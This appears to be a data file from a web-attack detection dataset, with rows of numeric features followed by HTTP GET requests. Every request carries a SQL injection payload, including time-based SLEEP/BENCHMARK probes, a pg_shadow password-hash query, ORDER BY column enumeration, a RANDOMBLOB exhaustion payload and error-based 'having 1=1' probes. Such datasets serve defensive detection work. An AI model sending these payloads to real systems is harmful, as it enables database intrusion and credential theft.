118,2,200,6346,31,29,15,1,1,GET ?account= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11&pass=select * from pg_shadow; HTTP/1.1
32,1,200,5148,14,4,4,1,1,GET ?pass= ORDER BY 8#  HTTP/1.1
32,1,200,4953,14,4,4,1,1,GET ?pass= ORDER BY 8#  HTTP/1.1
32,1,200,3093,14,4,4,1,1,GET ?pass= ORDER BY 8#  HTTP/1.1
32,1,200,2864,14,4,4,1,1,GET ?pass= ORDER BY 8#  HTTP/1.1
32,1,200,2360,14,4,4,1,1,GET ?pass= ORDER BY 8#  HTTP/1.1
32,1,200,6486,14,4,4,1,1,GET ?pass= ORDER BY 8#  HTTP/1.1
32,1,200,1273,14,4,4,1,1,GET ?pass= ORDER BY 8#  HTTP/1.1
32,1,200,6751,14,4,4,1,1,GET ?pass= ORDER BY 8#  HTTP/1.1
32,1,200,3272,14,4,4,1,1,GET ?pass= ORDER BY 8#  HTTP/1.1
41,1,200,5302,17,2,5,2,1,GET ?id=RANDOMBLOB(1000000000/2) HTTP/1.1
41,1,200,3684,17,2,5,2,1,GET ?id=RANDOMBLOB(1000000000/2) HTTP/1.1
41,1,200,4535,17,2,5,2,1,GET ?id=RANDOMBLOB(1000000000/2) HTTP/1.1
41,1,200,3049,17,2,5,2,1,GET ?id=RANDOMBLOB(1000000000/2) HTTP/1.1
41,1,200,5346,17,2,5,2,1,GET ?id=RANDOMBLOB(1000000000/2) HTTP/1.1
41,1,200,7712,17,2,5,2,1,GET ?id=RANDOMBLOB(1000000000/2) HTTP/1.1
53,1,200,2005,7,27,7,1,1,GET ?username=' group by userid having 1=1-- HTTP/1.1
53,1,200,2720,7,27,7,1,1,GET ?username=' group by userid having 1=1-- HTTP/1.1
53,1,200,4523,7,27,7,1,1,GET ?username=' group by userid having 1=1-- HTTP/1.1
53,1,200,3598,7,27,7,1,1,GET ?username=' group by userid having 1=1-- HTTP/1.1
53,1,200,6942,7,27,7,1,1,GET ?username=' group by userid having 1=1-- HTTP/1.1
39,1,200,4608,7,21,4,1,1,GET ?code=select current_user; HTTP/1.1
39,1,200,1279,7,21,4,1,1,GET ?code=select current_user; HTTP/1.1
39,1,200,3155,7,21,4,1,1,GET ?code=select current_user; HTTP/1.1
39,1,200,6601,7,21,4,1,1,GET ?code=select current_user; HTTP/1.1
